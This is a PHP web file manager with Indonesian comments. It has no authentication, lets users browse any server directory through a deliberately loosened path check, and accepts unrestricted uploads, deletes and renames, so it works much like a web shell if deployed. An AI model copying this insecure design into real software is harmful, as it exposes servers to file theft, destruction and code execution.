<?php
// Simple File Manager - Bisa naik ke parent directory
// Security: Untuk development saja!

// Ambil base dari lokasi file
$base_dir = dirname(__FILE__);

// Handle ganti base directory
if (isset($_GET['set_base'])) {
    $new_base = realpath($_GET['set_base']);
    if ($new_base && is_dir($new_base)) {
        $base_dir = $new_base;
    }
}

$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $base_dir;

// **Diperlonggar** - izinkan naik ke parent
if (!is_dir($current_dir)) {
    $current_dir = $base_dir;
}

function format_size($bytes) {
    if ($bytes === 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}

// Handle actions
$action = isset($_GET['action']) ? $_GET['action'] : '';
$msg = '';

// Download
if ($action === 'download') {
    $file_path = $current_dir . '/' . basename($_GET['file'] ?? '');
    if (is_file($file_path) && file_exists($file_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
        exit;
    } else {
        $msg = 'File tidak ditemukan!';
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['action'])) {
        $target = $current_dir . '/' . basename($_POST['target'] ?? '');
        
        if ($_POST['action'] === 'rename') {
            $new_name = basename($_POST['new_name'] ?? '');
            if ($new_name && rename($target, $current_dir . '/' . $new_name)) {
                $msg = 'Renamed successfully!';
            } else {
                $msg = 'Rename failed!';
            }
        } elseif ($_POST['action'] === 'upload' && isset($_FILES['file'])) {
            $upload_file = $current_dir . '/' . basename($_FILES['file']['name']);
            if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
                $msg = 'File uploaded successfully!';
            } else {
                $msg = 'Upload failed!';
            }
        }
    }
}

// Delete
if ($action === 'delete') {
    $file = $current_dir . '/' . basename($_GET['file'] ?? '');
    if (is_file($file)) {
        unlink($file);
        $msg = 'File deleted!';
    } elseif (is_dir($file) && $file !== $base_dir) {
        rmdir($file);
        $msg = 'Folder deleted!';
    }
}

// Create folder
if (isset($_POST['create_folder'])) {
    $new_folder = $current_dir . '/' . basename($_POST['folder_name']);
    if (mkdir($new_folder)) {
        $msg = 'Folder created!';
    }
}

$items = scandir($current_dir);
$folders = [];
$files = [];

foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $path = $current_dir . '/' . $item;
    if (is_dir($path)) {
        $folders[] = $item;
    } else {
        $files[] = ['name' => $item, 'size' => filesize($path)];
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>File Manager</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { border: 1px solid #ddd; padding: 8px; }
        th { background-color: #f2f2f2; }
        .folder { color: blue; text-decoration: none; }
        .folder:hover { text-decoration: underline; }
        .msg { padding: 10px; background: #d4edda; margin: 10px 0; }
        .path { font-family: monospace; background: #f8f8f8; padding: 10px; }
    </style>
</head>
<body>
    <h1>File Manager</h1>
    <p><strong>Base Directory:</strong> <?= htmlspecialchars($base_dir) ?> 
       <a href="?set_base=<?= urlencode($current_dir) ?>">[Set as Base]</a>
    </p>
    
    <?php if ($msg): ?>
        <div class="msg"><?= htmlspecialchars($msg) ?></div>
    <?php endif; ?>

    <div class="path">
        Current: <?= htmlspecialchars($current_dir) ?>
    </div>

    <div style="margin: 10px 0;">
        <?php 
        $parts = explode('/', trim($current_dir, '/'));
        $accum = '';
        foreach ($parts as $part) {
            if ($part === '') continue;
            $accum .= '/' . $part;
            echo '<a href="?dir=' . urlencode($accum) . '">' . htmlspecialchars($part) . '</a> / ';
        }
        ?>
    </div>

    <h3>Upload File</h3>
    <form method="post" enctype="multipart/form-data">
        <input type="hidden" name="action" value="upload">
        <input type="file" name="file">
        <button type="submit">Upload</button>
    </form>

    <h3>Buat Folder Baru</h3>
    <form method="post">
        <input type="text" name="folder_name" placeholder="Nama folder" required>
        <button type="submit" name="create_folder">Buat</button>
    </form>

    <table>
        <tr>
            <th>Nama</th>
            <th>Tipe</th>
            <th>Ukuran</th>
            <th>Aksi</th>
        </tr>
        <?php foreach ($folders as $folder): ?>
        <tr>
            <td><a href="?dir=<?= urlencode($current_dir . '/' . $folder) ?>" class="folder">📁 <?= htmlspecialchars($folder) ?></a></td>
            <td>Folder</td>
            <td>-</td>
            <td>
                <a href="?dir=<?= urlencode($current_dir) ?>&action=delete&file=<?= urlencode($folder) ?>" onclick="return confirm('Hapus?')">Hapus</a>
            </td>
        </tr>
        <?php endforeach; ?>

        <?php foreach ($files as $file): ?>
        <tr>
            <td>📄 <?= htmlspecialchars($file['name']) ?></td>
            <td>File</td>
            <td><?= format_size($file['size']) ?></td>
            <td>
                <a href="?dir=<?= urlencode($current_dir) ?>&action=download&file=<?= urlencode($file['name']) ?>">Download</a> |
                <a href="?dir=<?= urlencode($current_dir) ?>&action=delete&file=<?= urlencode($file['name']) ?>" onclick="return confirm('Hapus?')">Hapus</a> |
                <form method="post" style="display:inline;">
                    <input type="hidden" name="action" value="rename">
                    <input type="hidden" name="target" value="<?= htmlspecialchars($file['name']) ?>">
                    <input type="text" name="new_name" value="<?= htmlspecialchars($file['name']) ?>" size="18">
                    <button type="submit">Rename</button>
                </form>
            </td>
        </tr>
        <?php endforeach; ?>
    </table>
</body>
</html>
